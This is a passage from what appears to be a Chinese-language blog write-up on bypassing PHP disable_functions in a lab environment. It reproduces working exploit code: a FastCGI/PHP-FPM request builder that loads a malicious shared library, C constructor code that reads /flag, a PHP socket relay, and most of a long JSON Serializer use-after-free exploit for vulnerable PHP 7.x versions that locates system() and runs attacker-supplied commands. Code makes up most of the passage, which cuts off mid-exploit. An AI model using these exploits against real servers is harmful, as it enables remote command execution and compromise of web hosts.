class="comment">#application/x-www-form-urlencoded</span></span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % len(content),</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;extension=/tmp/fe1w0.so&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>:<span class="string">&#x27;extension=/tmp/fe1w0.so&#x27;</span> <span class="comment"># è°ƒç”¨è‡ªå·±çš„å…±äº«åº“</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    <span class="comment"># base64</span></span><br><span class="line">    result = base64.encodebytes(response).strip().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    print(result)</span><br><span class="line">    <span class="comment"># urlencde ä¸‹é¢ä¸¤è¡Œæ˜¯urlencde</span></span><br><span class="line">    <span class="comment">#response = urlparse.quote(response)</span></span><br><span class="line">    <span class="comment">#print(response)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> ~/project/www_win/test/<span class="number">2020</span>_11_5_bypass_disable_function/fastcgi-fpm ------------------------------------ at <span class="number">17</span>:<span class="number">34</span>:<span class="number">29</span></span><br><span class="line">&gt; python3 fastcgi.py <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> /var/www/html/index.php -c <span class="string">&quot;&lt;?php system(&#x27;ls&#x27;)?&gt;&quot;</span></span><br><span class="line">AQFZcAAIAAAAAQAAAAAAAAEEWXAB1AAAEQtHQVRFV0FZX0lOVEVSRkFDRUZhc3RDR0kvMS4wDgRS</span><br><span class="line">RVFVRVNUX01FVEhPRFBPU1QPF1NDUklQVF9GSUxFTkFNRS92YXIvd3d3L2h0bWwvaW5kZXgucGhw</span><br><span class="line">CxdTQ1JJUFRfTkFNRS92YXIvd3d3L2h0bWwvaW5kZXgucGhwDABRVUVSWV9TVFJJTkcLF1JFUVVF</span><br><span class="line">U1RfVVJJL3Zhci93d3cvaHRtbC9pbmRleC5waHANAURPQ1VNRU5UX1JPT1QvDw5TRVJWRVJfU09G</span><br><span class="line">VFdBUkVwaHAvZmNnaWNsaWVudAsJUkVNT1RFX0FERFIxMjcuMC4wLjELBFJFTU9URV9QT1JUOTk4</span><br><span class="line">NAsJU0VSVkVSX0FERFIxMjcuMC4wLjELAlNFUlZFUl9QT1JUODALCVNFUlZFUl9OQU1FbG9jYWxo</span><br><span class="line">b3N0DwhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMQwQQ09OVEVOVF9UWVBFYXBwbGljYXRpb24vdGV4</span><br><span class="line">dA4CQ09OVEVOVF9MRU5HVEgyMA8XUEhQX0FETUlOX1ZBTFVFZXh0ZW5zaW9uPS90bXAvZmUxdzAu</span><br><span class="line">c28JF1BIUF9WQUxVRWV4dGVuc2lvbj0vdG1wL2ZlMXcwLnNvAQRZcAAAAAABBVlwABQAADw/cGhw</span><br><span class="line">IHN5c3RlbSgnbHMnKT8+AQVZcAAAAAA=</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ³¨æ„è¿™é‡Œçš„system()å‡½æ•°æ˜¯ä¸ä¼šæ‰§è¡Œçš„,disable_function</p>
</blockquote>
<p>fe1w0.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;tac /flag &gt;/tmp/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fe1w0.soç”Ÿæˆ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC fe1w0.c -o fe1w0 &amp;&amp; gcc --share fe1w0 -o fe1w0.so</span><br></pre></td></tr></table></figure>

<p>fe1w0.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fe1w0.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $sock=stream_socket_client(<span class="string">&#x27;tcp://127.0.0.1:9000&#x27;</span>);</span><br><span class="line">    <span class="comment">//unix:///run/php/php7.2-fpm.sock</span></span><br><span class="line">    var_dump(base64_decode($_POST[<span class="string">&#x27;fe1w0&#x27;</span>]));</span><br><span class="line">    fputs($sock, base64_decode($_POST[<span class="string">&#x27;fe1w0&#x27;</span>]));</span><br><span class="line">    var_dump(fread($sock, <span class="number">4096</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>   <img src="http://img.xzaslxr.xyz/img/image-20201115173636858.png" alt="image-20201115173636858"></p>
<p><img src="http://img.xzaslxr.xyz/img/image-20201115173703808.png" alt="image-20201115173703808"></p>
<h3 id="0x05-Json-Serializer-UAF"><a href="#0x05-Json-Serializer-UAF" class="headerlink" title="0x05 Json Serializer UAF"></a>0x05 Json Serializer UAF</h3><p>åˆ©ç”¨jsonåºåˆ—åŒ–ä¸­çš„å †æº¢å‡ºè§¦å‘ï¼Œå€Ÿä»¥ç»•è¿‡disable_function</p>
<p>ä½¿ç”¨æ¡ä»¶</p>
<ul>
<li>Linux æ“ä½œç³»ç»Ÿ</li>
<li>PHP ç‰ˆæœ¬<ul>
<li>7.1 - all versions to date</li>
<li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li>
<li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li>
</ul>
</li>
</ul>
<p>ç¯å¢ƒ:</p>
<p>AntSword-Labs/bypass_disable_functions/6</p>
<p>payload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">$cmd = $_POST[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line"></span><br><span class="line">$n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySplFixedArray</span> <span class="keyword">extends</span> <span class="title">SplFixedArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> $leak;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Z</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">      $i = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">        $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">        $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unable to leak ro segments</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak1</span>(<span class="params">$addr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $spl1;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">8</span>, $addr - <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">return</span> strlen(get_class($spl1));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the real deal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak2</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $spl1, $fake_tbl_off;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake reference zval</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="number">0x10</span>, <span class="number">0xdeadbeef</span>); <span class="comment"># gc_refcounted</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="number">0x18</span>, $addr + $p - <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="number">0x20</span>, <span class="number">6</span>); <span class="comment"># type (string)</span></span><br><span class="line"></span><br><span class="line">        $leak = strlen($spl1::$leak);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = <span class="keyword">$this</span>-&gt;leak2($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = <span class="keyword">$this</span>-&gt;leak2($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = <span class="keyword">$this</span>-&gt;leak2($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = <span class="keyword">$this</span>-&gt;leak2($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = <span class="keyword">$this</span>-&gt;leak2($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = <span class="keyword">$this</span>-&gt;leak2($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = <span class="keyword">$this</span>-&gt;leak2($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = <span class="keyword">$this</span>-&gt;leak2($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = <span class="keyword">$this</span>-&gt;leak2($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = <span class="keyword">$this</span>-&gt;leak2($leak);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = <span class="keyword">$this</span>-&gt;leak2($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = <span class="keyword">$this</span>-&gt;leak2($leak);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = <span class="keyword">$this</span>-&gt;leak2($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = <span class="keyword">$this</span>-&gt;leak2($addr);</span><br><span class="line">            $f_name = <span class="keyword">$this</span>-&gt;leak2($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;leak2($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;</span><br><span class="line"></span><br><span class="line">        $contiguous = [];</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">            $contiguous[] = <span class="keyword">new</span> DateInterval(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        $room = [];</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">            $room[] = <span class="keyword">new</span> Z();</span><br><span class="line"></span><br><span class="line">        $_protector = <span class="keyword">$this</span>-&gt;ptr2str(<span class="number">0</span>, <span class="number">78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;abc = <span class="keyword">$this</span>-&gt;ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">        $p = <span class="keyword">new</span> DateInterval(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unset</span>($y[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">unset</span>($p);</span><br><span class="line"></span><br><span class="line">        $protector = <span class="string">&quot;.<span class="subst">$_protector</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">        $x = <span class="keyword">new</span> DateInterval(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line">        $x-&gt;d = <span class="number">0x2000</span>;</span><br><span class="line">        $x-&gt;h = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        <span class="comment"># $this-&gt;abc is now of size 0x2000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc) != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;UAF failed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $spl1 = <span class="keyword">new</span> MySplFixedArray();</span><br><span class="line">        $spl2 = <span class="keyword">new</span> MySplFixedArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment"># some leaks</span></span><br><span class="line">        $class_entry = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x120</span>);</span><br><span class="line">        $handlers = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x128</span>);</span><br><span class="line">        $php_heap = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x1a8</span>);</span><br><span class="line">        $abc_addr = $php_heap - <span class="number">0x218</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake class_entry</span></span><br><span class="line">        $fake_obj = $abc_addr;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0</span>, <span class="number">2</span>); <span class="comment"># type</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x120</span>, $abc_addr); <span class="comment"># fake class_entry</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy some of class_entry definition</span></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x10</span> + $i * <span class="number">8</span>, </span><br><span class="line">                <span class="keyword">$this</span>-&gt;leak1($class_entry + <span class="number">0x10</span> + $i * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake static members table</span></span><br><span class="line">        $fake_tbl_off = <span class="number">0x70</span> * <span class="number">4</span> - <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x30</span>, $abc_addr + $fake_tbl_off);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x38</span>, $abc_addr + $fake_tbl_off);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake zval_reference</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="number">8</span>, <span class="number">10</span>); <span class="comment"># zval type (reference)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># look for binary base</span></span><br><span class="line">        $binary_leak = <span class="keyword">$this</span>-&gt;leak2($handlers + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(!($base = <span class="keyword">$this</span>-&gt;get_binary_base($binary_leak))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse elf header</span></span><br><span class="line">        <span class="keyword">if</span>(!($elf = <span class="keyword">$this</span>-&gt;parse_elf($base))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get basic_functions address</span></span><br><span class="line">        <span class="keyword">if</span>(!($basic_funcs = <span class="keyword">$this</span>-&gt;get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">        